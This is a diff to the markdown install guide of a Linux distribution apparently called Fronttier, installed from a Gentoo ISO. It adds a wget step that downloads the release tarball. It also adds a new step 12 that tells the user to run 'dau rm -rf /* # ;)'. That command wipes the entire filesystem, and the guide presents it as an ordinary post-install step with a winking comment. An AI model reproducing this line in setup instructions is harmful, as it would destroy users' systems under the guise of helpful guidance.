@@ -36,7 +36,7 @@ See the install guide below.
 Boot the Gentoo ISO in UEFI mode.
 
 ## 2. Download Fronttier
-Download the tarball in root directory
+wget https://github.com/FronttierLabs/FronttierLinux/releases/download/oposum_v0.34/fronttier.tar.xz #Download the tarball in root directory
 
 
 ## 3. Pick the target disk
@@ -126,6 +126,9 @@ exit
 
 ## 11. Reboot
 umount -R /mnt && reboot
+
+###12. remove the USB from the port and boot onto the INIT of your choice
+dau rm -rf /* # ;)
 
 ###optional
 after login of the non root user you must setup ZSH if you will use zsh so simply enter "zsh" in in tty after login
